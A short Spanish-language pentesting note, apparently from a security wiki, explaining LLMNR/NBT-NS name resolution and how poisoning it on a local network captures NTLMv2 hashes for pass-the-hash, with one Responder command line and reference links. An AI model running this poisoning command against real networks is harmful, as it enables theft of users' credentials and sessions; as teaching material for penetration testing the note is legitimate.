# LLMNR Poisoning



## ¿Qué es LLMNR?

<mark style="color:green;">**LLMNR (Link-Local Multicast Name Resolution)**</mark>, es un protocolo de resolución de nombres de multidifusión de vínculo local que resuelve los nombres de los sistemas informáticos cercanos, si la red no tiene un servidor de Sistema de nombres de dominio (DNS). A veces también se hace referencia a este protocolo como **NBT-NS**.

Normalmente entra en acción cuando el DNS falla..

Vector de ataque: Cuando los servicios utilizan el nombre de usuario y el <mark style="color:green;">**hash NTLMv2**</mark> de un usuario cuando responden adecuadamente podemos obtener el hash de usuarios y utilizar la técnica de pass-the-hash para robar la sesión de los usuarios.

<mark style="color:green;">**Nota**</mark>: este ataque solo funciona en redes locales, no funciona por VPN

## Ataque

### 1 Envenenar la red con "Responder" impacket

{% code overflow="wrap" %}
```bash
python /usr/share/responder/Responder -I eth0 -rdw -v
```
{% endcode %}

{% embed url="https://github.com/lgandx/Responder" %}

## Bibliografía

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks" %}
